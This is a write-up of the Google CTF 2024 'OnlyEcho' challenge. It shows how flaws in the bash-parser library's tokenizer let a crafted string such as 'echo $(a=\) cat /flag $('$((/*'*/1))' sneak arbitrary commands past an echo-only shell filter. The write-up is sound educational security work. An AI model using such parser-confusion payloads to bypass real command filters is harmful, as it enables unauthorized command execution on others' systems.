---
title: OnlyEcho (Google CTF 2024; misc)
date: 2024-06-24
---
> I like echo because my friends told me it's safe. I made a shell that only allows you to run echo, how cool is that?

files: [link](https://github.com/google/google-ctf/tree/main/2024/quals/misc-onlyecho/attachments)
### First steps
Looking at the challenge code, we can see that it checks the bash code you've entered for redirections and any invocations besides `echo`. This sounds like a solid defence, even more so when you try and bypass that normally with other features of bash ([here](https://www.gnu.org/software/bash/manual/bash.html) is a complete reference). Actually, something seems strange...
### bash-parser
By experiment (or if you went over into the repo and read the issues in there) it's not hard to notice that the parser is very much flawed. There are many strings it fails to parse, although it's not clear yet how to abuse that.
If you go through the issues or try to figure out why certain strings don't parse, you might notice that it doesn't recognize escaped parentheses as escaped (this is also true for VS Code tokenizer and tokenizer used for rendering this page):
```bash
echo $(\) ls )
```
Bash would execute the command expansion with the `ls`, while `bash-parser` will think it was closed at the start.
There are two problems with this line. First of all, bash will execute ")" as a command and just throw an error. This can be circumvented using variable assignment:
```bash
echo $(a=\) ls )
```
The second problem is the closing parenthesis at the end. `bash-parser` doesn't like the "broken" syntax. This turns out to be much trickier to bypass.
### Diving into code
Just playing around or looking at issues won't do now, we need to find the issue ourselves. Exploring the insides of the tokenizer, we see many reducers ("states"). Here we can see that there are no other escaping complications we can exploit, but if you are careful enough, you can notice this in the [`expansion-command-or-arithmetic.js`](https://github.com/vorpaljs/bash-parser/blob/67a05de4238e4fea016677c308ce101070e9c4e8/src/modes/posix/tokenizer/reducers/expansion-command-or-arithmetic.js) file:
```js
if (char === '(' && state.current.slice(-2) === '$(') {
	return {
		nextReduction: reducers.expansionArithmetic,
		nextState: state.appendChar(char)
	};
}
```
This means that in the `expansionCommandOrArithmetic` reducer, whenever there is a sequence `$((` it switches to `expansionArithmetic` and expects two closing parenthesis, even if it's not the start of the expansion. The `expansionCommandOrArithmetic` reducer actually doesn't care about escaping or anything (as the inside is parsed afterwards), so something like `$( '$((' ))` will be tokenized without an error, while for bash it contains an extra closing parenthesis. This makes our payload this:
```bash
echo $(a=\) ls $( '$((' ))
```
And so we win... or not quite:
```
SyntaxError: Cannot parse arithmetic expression "' ": Unterminated string constant (1:0)
    at parseArithmeticAST (/mnt/c/stuff/ctf/google/onlyecho/node_modules/bash-parser/src/modes/posix/rules/arithmetic-expansion.js:15:9)
```
The inside of the arithmetic expansion, `' `, is not valid syntax. How do you even make it valid in bash? Actually, it's not even bash. This parser is (yet again) flawed. If you look into the code, you can see it parses the expression as JS, using Babel. This allows us to easily bypass the problem using comments, which bash will parse as normal words:
```bash
echo $(a=\) ls $( '$((/*'*/ ))
```
This almost works, except it doesn't:
```
Error: TypeError: Cannot read properties of undefined (reading 'expression')
```
Fortunately, this is very easy to fix. We just need to make it an expression (so add something besides the comments):
```bash
echo $(a=\) ls $('$((/*'*/1))
```
The final, flag-reading payload:
```bash
echo $(a=\) cat /flag $('$((/*'*/1))
```